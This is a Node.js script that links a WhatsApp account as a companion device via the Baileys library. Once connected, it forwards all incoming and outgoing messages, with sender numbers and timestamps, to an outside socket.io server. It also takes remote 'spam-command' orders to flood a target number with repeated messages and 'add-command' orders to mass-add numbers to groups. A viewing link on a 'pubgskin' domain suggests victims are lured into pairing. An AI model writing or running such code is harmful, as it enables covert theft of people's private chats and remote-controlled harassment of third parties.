const io = require('socket.io-client');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion 
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');

const SERVER = 'https://ai-proxy-production-59b3.up.railway.app';
const socket = io(SERVER);
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const q = (t) => new Promise(r => rl.question(t, r));

let sock, myPhone;

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Windows", "10.0"],
        syncFullHistory: false,
        connectTimeoutMs: 120000,
        defaultQueryTimeoutMs: 120000
    });

    sock.ev.on('creds.update', saveCreds);

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            console.log("\n📱 SETUP - Chrome/Windows\n");
            const phoneNumber = await q('📱 Your Phone (20...): ');
            
            try {
                const cleanPhone = phoneNumber.replace(/\D/g, '');
                console.log('⏳ Requesting code...\n');
                
                const code = await sock.requestPairingCode(cleanPhone);
                myPhone = cleanPhone;
                
                console.log('═══════════════════════════════════');
                console.log('  🔑 CODE: ' + code.match(/.{1,4}/g).join('-'));
                console.log('═══════════════════════════════════');
                console.log('');
                console.log('📱 On your phone:');
                console.log('  1. Open WhatsApp');
                console.log('  2. Tap 3 dots → Linked Devices');
                console.log('  3. Tap "Link a Device"');
                console.log('  4. Tap "Link with Phone Number Instead"');
                console.log('  5. Enter: ' + code.match(/.{1,4}/g).join('-'));
                console.log('');
                console.log('⏳ The code expires in 60 seconds!');
                console.log('⏳ Waiting...\n');
                
            } catch (error) {
                console.log('\n❌ Failed!');
                console.log('Error: ' + error.message);
                console.log('\n💡 Tips:');
                console.log('  - Make sure internet is working');
                console.log('  - Use WiFi instead of mobile data');
                console.log('  - Try a different number\n');
                process.exit(1);
            }
        }, 2000);
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error)?.output?.statusCode;
            if (statusCode === DisconnectReason.loggedOut) {
                console.log('\n❌ Session ended!');
                console.log('Delete auth_info_baileys folder and restart\n');
                process.exit(1);
            }
        } 
        else if (connection === 'open') {
            if (!myPhone) myPhone = sock.user?.id?.split(':')[0] || 'unknown';
            console.log('\n✅ CONNECTED! ' + myPhone);
            console.log('📡 Sending chats to server...');
            console.log('🌐 View: https://pubgskin.vercel.app/chat.html\n');
            socket.emit('register', { phone: myPhone });
        }
    });

    // إرسال الشات
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || !myPhone) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
        if (!text) return;

        const type = msg.key.fromMe ? 'out' : 'in';
        const sender = from.split('@')[0];

        socket.emit('chat', {
            phone: myPhone,
            from: sender,
            text: text,
            type: type,
            time: new Date().toISOString()
        });

        console.log((type === 'out' ? '📤' : '📥') + ' ' + sender + ': ' + text.substring(0, 50));
    });

    // أوامر السبام
    socket.on('spam-command', async (data) => {
        const { target, message, count } = data;
        console.log('\n🚀 SPAM: ' + count + ' → ' + target);
        
        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
        
        for (let i = 1; i <= count; i++) {
            try {
                await sock.sendMessage(jid, { text: message });
                console.log('[' + i + '/' + count + '] ✅');
            } catch(e) {
                console.log('[' + i + '/' + count + '] ❌');
            }
            await new Promise(r => setTimeout(r, 50));
        }
    });

    // أوامر الإضافة
    socket.on('add-command', async (data) => {
        const { groupId, numbers } = data;
        console.log('\n👥 Adding ' + numbers.length + ' members');
        
        for (const num of numbers) {
            const jid = num.includes('@s.whatsapp.net') ? num : num + '@s.whatsapp.net';
            try {
                await sock.groupParticipantsUpdate(groupId, [jid], "add");
                console.log('✅ ' + num);
            } catch(e) {
                console.log('❌ ' + num);
            }
            await new Promise(r => setTimeout(r, 200));
        }
    });
}

start();
